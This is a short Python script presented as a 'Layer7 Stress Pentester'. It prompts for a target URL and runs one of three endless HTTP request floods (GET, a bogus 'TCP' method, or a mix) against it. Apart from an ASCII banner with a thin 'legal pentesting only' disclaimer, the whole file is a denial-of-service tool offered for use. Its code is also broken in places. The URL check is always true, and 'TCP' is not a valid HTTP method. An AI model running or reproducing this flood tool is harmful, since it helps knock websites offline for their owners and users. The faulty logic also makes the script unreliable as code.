import os
import requests
from colorama import Fore

logo = '''


 ██████╗  █████╗ ██╗      █████╗ ██╗  ██╗██╗   ██╗    ██╗  ██╗   ██╗███████╗
██╔════╝ ██╔══██╗██║     ██╔══██╗╚██╗██╔╝╚██╗ ██╔╝    ██║  ╚██╗ ██╔╝╚════██║
██║  ███╗███████║██║     ███████║ ╚███╔╝  ╚████╔╝     ██║   ╚████╔╝     ██╔╝
██║   ██║██╔══██║██║     ██╔══██║ ██╔██╗   ╚██╔╝      ██║    ╚██╔╝     ██╔╝ 
╚██████╔╝██║  ██║███████╗██║  ██║██╔╝ ██╗   ██║       ███████╗██║      ██║  
 ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       ╚══════╝╚═╝      ╚═╝  
                                                                            
      * Galaxy LY7 Basic Layer7 Stress Pentester by WeepingAngel *
            USE FOR LEGAL PESTETING AND EDUCATION ONLY!
                | Dont Hit any .edu or .gov Websites! |



'''

os.system("title [/] User: %username%  GalaxyLY7  Servers: [1]") # Its jsut decoration :)


print(Fore.LIGHTMAGENTA_EX + logo)
ip = input("Enter Target URL > ")

if ip == "http://" or "https://":
    print(Fore.RED + "Attack Method:")
    print(Fore.LIGHTMAGENTA_EX + "[1] HTTP-GET Flood         | HTTP-GET Flood Bypass")
    print(Fore.LIGHTMAGENTA_EX + "[2] HTTP-REQUEST Flood     | HTTP-REQUEST Flood Bypass")
    print(Fore.LIGHTMAGENTA_EX + "[3] HTTP-MIX Flood         | HTTP-MIX GET and Request Mixed")
    x = input("root~GalaxyLY7~$ ")

    if x == "1":
        print("Attack Started | Going Dark!")
        while True:
            requests.get(ip)
            requests.get(ip)
            requests.get(ip)
            requests.get(ip)
            requests.get(ip)
            requests.get(ip)
            requests.get(ip)
            requests.get(ip)

    if x == "2":
        print("Attack Started | Going Dark!")
        while True:
            requests.request(url=ip, method="TCP")
            requests.request(url=ip, method="TCP")
            requests.request(url=ip, method="TCP")
            requests.request(url=ip, method="TCP")
            requests.request(url=ip, method="TCP")
            requests.request(url=ip, method="TCP")

    if x == "3":
        print("Attack Started | Going Dark!")
        while True:
            requests.get(ip)
            requests.request(url=ip, method="TCP")
            requests.get(ip)
            requests.request(url=ip, method="TCP")
            requests.get(ip)
            requests.request(url=ip, method="TCP")
            requests.get(ip)
            requests.request(url=ip, method="TCP")
            requests.get(ip)
            requests.request(url=ip, method="TCP")
            requests.get(ip)
            requests.request(url=ip, method="TCP")
            requests.get(ip)
            requests.request(url=ip, method="TCP")
            requests.get(ip)
            requests.request(url=ip, method="TCP")
            requests.get(ip)
            requests.request(url=ip, method="TCP")
            requests.get(ip)
            requests.request(url=ip, method="TCP")

else:
    print("Please enter a URL Not an IP!")
    exit(code=-1)


